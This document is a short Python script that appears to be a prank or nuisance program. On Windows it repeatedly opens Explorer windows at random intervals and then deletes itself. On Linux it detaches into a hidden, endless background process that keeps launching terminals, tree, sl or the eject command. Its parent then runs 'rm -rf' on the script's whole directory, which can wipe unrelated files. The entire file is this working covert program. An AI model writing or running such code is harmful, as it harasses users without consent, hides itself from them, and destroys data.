#!/usr/bin/env python
#-*- coding: utf-8 -*-
import os
from os         import fork
from os         import name     as cOS
from os         import path     as p
from os         import setsid
from os         import system

import random
from random     import choice
from random     import randint

import subprocess
from subprocess import call

import time
from time       import sleep


""" Max latency: 2 mn """
MAX_LATENCY = 2*60 


def get_windows_path():
    """Check and correct the windows path
    Return string
    """
    path  = p.realpath(__file__)
    spath = path.split('\\')
    index = 0
    for segment in spath:
        if ' ' in segment:
            segment = segment[::-1]
            segment+="\""
            segment = segment[::-1]
            segment+="\""
            spath[index] = segment
        index += 1
    return "\\".join(spath)

def self_destruction():
    """self destroy the file regarding current OS then quit
    """
    if cOS == 'nt':
        selfDestruct = "del " \
                     + get_windows_path()
        system(selfDestruct)
    else:
        call(["rm","-rf", p.dirname(p.abspath(__file__))])
   


if __name__ == "__main__":
    # Windows
    if cOS == 'nt':
        for i in range(15):
            sleep(randint(0,MAX_LATENCY))
            system("start %windir%\explorer.exe")
        self_destruction()
        
    # Linux
    else:
        linux_threat = [
                ["xterm","vim"],
                ["eject","-t"] ,
                ["xterm","tree"],
                ["xterm","sl"]]
        pid = fork()
        if pid == 0:
            setsid()
            pid = fork()
            if pid == 0: # Now run as a background task
                while True: # Now polling
                    sleep(randint(0,MAX_LATENCY))
                    call(choice(linux_threat))
        else:
            self_destruction() # Destroy sources
